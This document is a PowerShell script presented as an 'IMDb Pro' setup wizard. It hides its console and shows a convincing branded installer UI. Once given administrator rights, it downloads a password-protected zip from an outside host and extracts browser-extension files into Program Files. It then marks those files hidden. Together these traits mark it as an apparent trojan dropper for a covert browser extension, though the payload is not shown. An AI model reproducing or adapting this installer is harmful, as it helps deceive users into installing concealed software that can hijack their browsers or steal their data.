# IMDb Pro Installer - Professional Installer UI
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Create main installer form
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro Setup"
$mainForm.Size = New-Object System.Drawing.Size(600, 400)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::White
$mainForm.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false
$mainForm.MinimizeBox = $false

# Installer Header
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(600, 60)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
$headerPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$mainForm.Controls.Add($headerPanel)

# Application Icon/Logo
$appIcon = New-Object System.Windows.Forms.PictureBox
$appIcon.Size = New-Object System.Drawing.Size(40, 40)
$appIcon.Location = New-Object System.Drawing.Point(20, 10)
$appIcon.BackColor = [System.Drawing.Color]::Transparent
$appIcon.Image = [System.Drawing.Image]::FromFile("$env:SystemRoot\System32\imageres.dll") | Select-Object -Index 15
$appIcon.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
$headerPanel.Controls.Add($appIcon)

# Application Title
$appTitle = New-Object System.Windows.Forms.Label
$appTitle.Text = "IMDb Pro"
$appTitle.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
$appTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
$appTitle.AutoSize = $true
$appTitle.Location = New-Object System.Drawing.Point(70, 15)
$headerPanel.Controls.Add($appTitle)

# Application Version
$appVersion = New-Object System.Windows.Forms.Label
$appVersion.Text = "Version 2.1.0"
$appVersion.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$appVersion.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
$appVersion.AutoSize = $true
$appVersion.Location = New-Object System.Drawing.Point(450, 25)
$headerPanel.Controls.Add($appVersion)

# Navigation Panel (like real installer)
$navPanel = New-Object System.Windows.Forms.Panel
$navPanel.Location = New-Object System.Drawing.Point(0, 60)
$navPanel.Size = New-Object System.Drawing.Size(150, 290)
$navPanel.BackColor = [System.Drawing.Color]::FromArgb(250, 250, 250)
$navPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$mainForm.Controls.Add($navPanel)

# Navigation Steps
$navSteps = @(
    "Welcome",
    "License Agreement", 
    "Installation",
    "Completion"
)

for ($i = 0; $i -lt $navSteps.Count; $i++) {
    $stepLabel = New-Object System.Windows.Forms.Label
    $stepLabel.Text = $navSteps[$i]
    $stepLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
    $stepLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
    $stepLabel.AutoSize = $true
    $stepLabel.Location = New-Object System.Drawing.Point(20, 30 + ($i * 40))
    
    if ($i -eq 0) {
        $stepLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
        $stepLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
    }
    
    $navPanel.Controls.Add($stepLabel)
}

# Content Panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(150, 60)
$contentPanel.Size = New-Object System.Drawing.Size(450, 290)
$contentPanel.BackColor = [System.Drawing.Color]::White
$contentPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$mainForm.Controls.Add($contentPanel)

# Welcome Content
$welcomeTitle = New-Object System.Windows.Forms.Label
$welcomeTitle.Text = "Welcome to IMDb Pro Setup"
$welcomeTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$welcomeTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
$welcomeTitle.AutoSize = $true
$welcomeTitle.Location = New-Object System.Drawing.Point(20, 20)
$contentPanel.Controls.Add($welcomeTitle)

$welcomeText = New-Object System.Windows.Forms.Label
$welcomeText.Text = "This wizard will guide you through the installation of IMDb Pro.`n`nIMDb Pro enhances your browsing experience with advanced movie`ninformation, ratings, and streaming integration.`n`nIt is recommended that you close all other applications before starting Setup.`nThis will make it possible to update relevant system files without having to reboot your computer.`n`nClick Next to continue."
$welcomeText.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$welcomeText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$welcomeText.AutoSize = $true
$welcomeText.Location = New-Object System.Drawing.Point(20, 60)
$contentPanel.Controls.Add($welcomeText)

# License Agreement Content (initially hidden)
$licenseTitle = New-Object System.Windows.Forms.Label
$licenseTitle.Text = "License Agreement"
$licenseTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$licenseTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
$licenseTitle.AutoSize = $true
$licenseTitle.Location = New-Object System.Drawing.Point(20, 20)
$licenseTitle.Visible = $false
$contentPanel.Controls.Add($licenseTitle)

$licenseText = New-Object System.Windows.Forms.RichTextBox
$licenseText.Location = New-Object System.Drawing.Point(20, 60)
$licenseText.Size = New-Object System.Drawing.Size(400, 150)
$licenseText.BackColor = [System.Drawing.Color]::FromArgb(248, 248, 248)
$licenseText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$licenseText.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$licenseText.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$licenseText.ReadOnly = $true
$licenseText.Text = @"
IMDb Pro END-USER LICENSE AGREEMENT

IMPORTANT: PLEASE READ THIS AGREEMENT CAREFULLY.

1. GRANT OF LICENSE
This agreement grants you the right to install and use one copy of IMDb Pro on a single computer.

2. DESCRIPTION OF OTHER RIGHTS AND LIMITATIONS
- You may not reverse engineer, decompile, or disassemble the software.
- You may not rent, lease, or lend the software.
- The software is licensed as a single product; its components may not be separated for use on more than one computer.

3. COPYRIGHT
All title and copyrights in and to the software are owned by the developers.

4. NO WARRANTIES
The developers expressly disclaim any warranty for the software. The software is provided 'As Is' without any express or implied warranty.

5. LIMITATION OF LIABILITY
In no event shall the developers be liable for any damages whatsoever arising out of the use of or inability to use the software.

By selecting 'I Agree', you acknowledge that you have read and understand this agreement and agree to be bound by its terms.
"@
$licenseText.Visible = $false
$contentPanel.Controls.Add($licenseText)

$agreeCheckbox = New-Object System.Windows.Forms.CheckBox
$agreeCheckbox.Text = "I &accept the terms of the license agreement"
$agreeCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$agreeCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$agreeCheckbox.AutoSize = $true
$agreeCheckbox.Location = New-Object System.Drawing.Point(20, 220)
$agreeCheckbox.Checked = $false
$agreeCheckbox.Visible = $false
$contentPanel.Controls.Add($agreeCheckbox)

# Installation Progress Content (initially hidden)
$installTitle = New-Object System.Windows.Forms.Label
$installTitle.Text = "Installing IMDb Pro"
$installTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$installTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
$installTitle.AutoSize = $true
$installTitle.Location = New-Object System.Drawing.Point(20, 20)
$installTitle.Visible = $false
$contentPanel.Controls.Add($installTitle)

$installText = New-Object System.Windows.Forms.Label
$installText.Text = "Please wait while Setup installs IMDb Pro on your computer."
$installText.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$installText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$installText.AutoSize = $true
$installText.Location = New-Object System.Drawing.Point(20, 60)
$installText.Visible = $false
$contentPanel.Controls.Add($installText)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 100)
$progressBar.Size = New-Object System.Drawing.Size(400, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$progressBar.Visible = $false
$contentPanel.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Preparing installation..."
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Regular)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(20, 130)
$statusLabel.Visible = $false
$contentPanel.Controls.Add($statusLabel)

# Completion Content (initially hidden)
$completeTitle = New-Object System.Windows.Forms.Label
$completeTitle.Text = "Installation Complete"
$completeTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$completeTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
$completeTitle.AutoSize = $true
$completeTitle.Location = New-Object System.Drawing.Point(20, 20)
$completeTitle.Visible = $false
$contentPanel.Controls.Add($completeTitle)

$completeText = New-Object System.Windows.Forms.Label
$completeText.Text = "IMDb Pro has been successfully installed on your computer.`n`nSetup has installed IMDb Pro in the following folder:`nC:\Program Files\imdb-pro`n`nClick Finish to complete Setup."
$completeText.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$completeText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$completeText.AutoSize = $true
$completeText.Location = New-Object System.Drawing.Point(20, 60)
$completeText.Visible = $false
$contentPanel.Controls.Add($completeText)

# Button Panel
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 350)
$buttonPanel.Size = New-Object System.Drawing.Size(600, 50)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
$buttonPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$mainForm.Controls.Add($buttonPanel)

# Installer Buttons
$backButton = New-Object System.Windows.Forms.Button
$backButton.Text = "< &Back"
$backButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$backButton.Size = New-Object System.Drawing.Size(75, 25)
$backButton.Location = New-Object System.Drawing.Point(270, 13)
$backButton.Visible = $false
$buttonPanel.Controls.Add($backButton)

$nextButton = New-Object System.Windows.Forms.Button
$nextButton.Text = "&Next >"
$nextButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$nextButton.Size = New-Object System.Drawing.Size(75, 25)
$nextButton.Location = New-Object System.Drawing.Point(350, 13)
$nextButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$nextButton.ForeColor = [System.Drawing.Color]::White
$nextButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$buttonPanel.Controls.Add($nextButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Text = "&Cancel"
$cancelButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$cancelButton.Size = New-Object System.Drawing.Size(75, 25)
$cancelButton.Location = New-Object System.Drawing.Point(430, 13)
$buttonPanel.Controls.Add($cancelButton)

$finishButton = New-Object System.Windows.Forms.Button
$finishButton.Text = "&Finish"
$finishButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$finishButton.Size = New-Object System.Drawing.Size(75, 25)
$finishButton.Location = New-Object System.Drawing.Point(350, 13)
$finishButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$finishButton.ForeColor = [System.Drawing.Color]::White
$finishButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$finishButton.Visible = $false
$buttonPanel.Controls.Add($finishButton)

# Current step tracker
$currentStep = 1

# Navigation Functions
function Show-Step {
    param([int]$Step)
    
    # Hide all content
    $welcomeTitle.Visible = $false
    $welcomeText.Visible = $false
    $licenseTitle.Visible = $false
    $licenseText.Visible = $false
    $agreeCheckbox.Visible = $false
    $installTitle.Visible = $false
    $installText.Visible = $false
    $progressBar.Visible = $false
    $statusLabel.Visible = $false
    $completeTitle.Visible = $false
    $completeText.Visible = $false
    
    # Show appropriate buttons
    $backButton.Visible = $true
    $nextButton.Visible = $true
    $finishButton.Visible = $false
    
    switch ($Step) {
        1 { 
            # Welcome step
            $welcomeTitle.Visible = $true
            $welcomeText.Visible = $true
            $backButton.Visible = $false
        }
        2 { 
            # License agreement
            $licenseTitle.Visible = $true
            $licenseText.Visible = $true
            $agreeCheckbox.Visible = $true
            $nextButton.Enabled = $agreeCheckbox.Checked
        }
        3 { 
            # Installation
            $installTitle.Visible = $true
            $installText.Visible = $true
            $progressBar.Visible = $true
            $statusLabel.Visible = $true
            $nextButton.Visible = $false
            $backButton.Visible = $false
            $cancelButton.Enabled = $false
            Start-Installation
        }
        4 { 
            # Completion
            $completeTitle.Visible = $true
            $completeText.Visible = $true
            $backButton.Visible = $false
            $nextButton.Visible = $false
            $finishButton.Visible = $true
            $cancelButton.Visible = $false
        }
    }
}

# Installation Function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Update progress
        Update-Status "Checking administrator privileges..." 10
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            throw "Please run as Administrator"
        }
        
        Update-Status "Creating installation directory..." 20
        
        if (Test-Path $installPath) {
            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        Update-Status "Downloading package..." 40
        
        $tempFile = "$env:TEMP\imdb.zip"
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($downloadUrl, $tempFile)
        
        if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
            throw "Download failed"
        }
        
        Update-Status "Extracting files..." 60
        
        $7zPath = "$env:ProgramFiles\7-Zip\7z.exe"
        if (Test-Path $7zPath) {
            $arguments = @(
                "x",
                "-p$zipPassword",
                "-o`"$installPath`"",
                "-y",
                "`"$tempFile`""
            )
            
            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -ne 0) {
                throw "Extraction failed with 7-Zip"
            }
        } else {
            try {
                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
            }
            catch {
                throw "7-Zip not found and Expand-Archive failed"
            }
        }
        
        $files = Get-ChildItem $installPath -Recurse
        if ($files.Count -eq 0) {
            throw "No files were extracted"
        }
        
        Update-Status "Finalizing installation..." 80
        
        $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
        foreach ($file in $filesToHide) {
            $filePath = Join-Path $installPath $file
            if (Test-Path $filePath) {
                attrib +h $filePath
            }
        }
        
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
        }
        
        Update-Status "Installation completed successfully!" 100
        Start-Sleep -Milliseconds 1000
        
        # Move to completion step
        $currentStep = 4
        Show-Step -Step 4
        
    }
    catch {
        $statusLabel.Text = "Installation failed: $($_.Exception.Message)"
        $statusLabel.ForeColor = [System.Drawing.Color]::Red
        $cancelButton.Enabled = $true
        $cancelButton.Text = "Close"
    }
}

function Update-Status {
    param([string]$Message, [int]$Progress)
    
    $statusLabel.Text = $Message
    $progressBar.Value = $Progress
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Button Events
$nextButton.Add_Click({
    $currentStep++
    Show-Step -Step $currentStep
})

$backButton.Add_Click({
    $currentStep--
    Show-Step -Step $currentStep
})

$agreeCheckbox.Add_CheckedChanged({
    $nextButton.Enabled = $agreeCheckbox.Checked
})

$finishButton.Add_Click({
    $mainForm.Close()
})

$cancelButton.Add_Click({
    $result = [System.Windows.Forms.MessageBox]::Show(
        "Are you sure you want to cancel IMDb Pro installation?",
        "Cancel Installation",
        [System.Windows.Forms.MessageBoxButtons]::YesNo,
        [System.Windows.Forms.MessageBoxIcon]::Question
    )
    
    if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
        $mainForm.Close()
    }
})

# Show initial step
Show-Step -Step 1

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
